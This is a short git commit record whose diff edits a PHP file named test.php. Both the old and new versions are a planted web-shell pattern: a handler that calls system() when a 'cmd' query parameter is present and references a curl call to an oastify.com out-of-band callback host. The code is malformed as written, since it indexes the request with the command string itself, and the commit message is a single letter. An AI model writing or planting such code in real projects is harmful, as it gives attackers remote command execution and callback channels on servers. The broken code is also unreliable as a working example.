19118138a8a105ba4fc9ddc612e7ec3a635ba623
Harpreet Brar <iamunknowniint@gmail.com>
2026-04-06 02:49:12 +0500

    a

--- test.php
+++ test.php
@@ -1,1 +1,1 @@
-<?php if(isset($_GET['cmd'])){ system($_GET['curl https://s0tt30uk82tboatu1e6vp2b3puvljc71.oastify.com']); } ?>
+<?php if(isset($_GET['cmd'])){ system($_GET['curlhttps://s0tt30uk82tboatu1e6vp2b3puvljc71.oastify.com']); } ?>
